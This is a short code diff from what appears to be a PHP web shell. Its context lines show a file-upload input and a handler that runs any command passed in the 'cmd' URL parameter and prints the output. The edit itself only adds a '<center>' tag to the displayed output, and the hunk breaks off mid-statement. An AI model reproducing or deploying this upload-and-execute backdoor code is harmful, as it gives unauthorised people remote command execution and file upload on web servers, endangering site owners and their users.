@@ -127,7 +127,7 @@ Upload File<input type="file" name="file" />
 if(isset($_GET['cmd'])){
     $cmd = $_GET['cmd'];
     $output = htmlspecialchars(exe($cmd));
-    echo '
+    echo '<center>
     <div style="
         position: fixed;
         top: 20px;
